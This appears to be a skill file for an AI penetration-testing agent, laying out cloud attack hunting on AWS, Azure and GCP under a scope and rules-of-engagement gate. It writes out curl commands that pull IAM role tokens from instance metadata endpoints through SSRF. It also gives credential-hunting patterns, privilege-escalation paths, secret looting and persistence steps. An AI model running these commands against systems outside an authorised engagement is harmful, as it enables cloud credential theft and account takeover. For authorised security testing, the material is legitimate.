---
name: hunt-cloud
description: Cloud attack hunting for AWS / Azure / GCP - credential discovery, metadata SSRF, IAM privesc, service enumeration, persistence. Scope + billing aware. Wiki-first, FIND schema output.
---

# Hunt: Cloud (AWS / Azure / GCP)

## Pre-Attack: Wiki Query (MANDATORY)
```
qmd_query "<provider> <service> attack iam privesc" via wiki-search MCP -> read matching page.
```
Core pages: [[aws-attacks]], [[cloud-iam-attacks]], [[gcp-attacks]], Azure under [[azure-ad-iam]] / [[azure-ad-enumerate]]. Metadata: [[aws-metadata-ssrf]], payload [[imds-cloud-metadata]].

**Self-heal:** wiki query empty -> create stub `wiki/techniques/cloud/<slug>.md` before proceeding.

## Scope + Safety Gate (READ FIRST)
- Confirm account/subscription/project IDs are in scope. Cloud resources are billable + logged (CloudTrail / Azure Activity / GCP Audit Logs) - enumeration is loud and may cost the client. No resource creation/deletion without RoE sign-off.
- Reuse keys from `loot.md` first. Never spray IAM users (lockout + GuardDuty).

## Attack Surface Signals
- Leaked creds: `.env`, `~/.aws/credentials`, CI/CD vars, S3/blob/GCS public objects, JS bundles, git history, `AKIA*`/`ASIA*` (AWS), `AccountKey=` (Azure), `"type":"service_account"` JSON (GCP).
- SSRF reachable app -> metadata service (169.254.169.254 / metadata.google.internal).
- Public storage: S3 `*.s3.amazonaws.com`, Azure `*.blob.core.windows.net`, GCS `storage.googleapis.com/<bucket>`.

## Methodology
1. **Identify + whoami:**
```bash
aws sts get-caller-identity
az account show;  az ad signed-in-user show
gcloud auth list;  gcloud config list
```
2. **Metadata SSRF (if app-side SSRF):**
```bash
# AWS IMDSv1
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
# Azure (Metadata:true header)
curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# GCP (Metadata-Flavor: Google)
curl -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
```
3. **Enumerate permissions:**
```bash
aws iam get-account-authorization-details;  enumerate-iam --access-key ... --secret-key ...   # or pacu
az role assignment list --assignee <id>;  ScoutSuite azure
gcloud projects get-iam-policy <proj>;  curl https://... (roadtools / ROADrecon for Entra)
```
4. **IAM privesc:** AWS (`iam:PassRole`+lambda/ec2, `sts:AssumeRole`, policy version, `iam:CreateAccessKey`); Azure (Owner/Contributor on subscription, `Microsoft.Authorization/*`, managed identity abuse, Automation runbooks); GCP (`iam.serviceAccounts.actAs`, `setIamPolicy`, deployment manager, `actAs` chains).
5. **Service loot:** S3/blob/GCS objects, Secrets Manager / Key Vault / Secret Manager, SSM parameters, Lambda/Function env, snapshots, EBS, Storage Account keys.
6. **Lateral / persistence (RoE-gated):** assume cross-account role, new access key, SSH key to instance metadata, service-account key creation, Automation account runbook.
7. **Distill to wiki (when confirmed):** if the finding is a reusable privesc chain or service-abuse technique, stage a GENERIC wiki candidate now (no client host): `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/cloud/cloud-iam-attacks.md` (or `--kind api-pattern --target-page cheatsheets/api-request-findings.md` for a reusable API pattern). Promote later via `scripts/wiki-promote.py`.

## FIND Output
Confirmed:
```
Create Vulns/Research/FIND-XXX-<SEV>-<provider>-<issue>.md
```
Severity: CRITICAL = creds to admin/owner, cross-account/tenant takeover, metadata role creds; HIGH = sensitive data read (secrets/buckets), IAM privesc path; MEDIUM = enumeration / public bucket with non-sensitive data.

Exhausted (whoami minimal perms, no privesc path, no readable secrets):
```
Append to Deadends.md: - [ ] AWS key AKIA... -- s3:GetObject only, no iam:*, no privesc (enumerate-iam clean)
```

Report: Status + files created.

## Context tools

<!-- auto-wired: documented tools to reach for; do not hand-roll -->
- [[aws]]
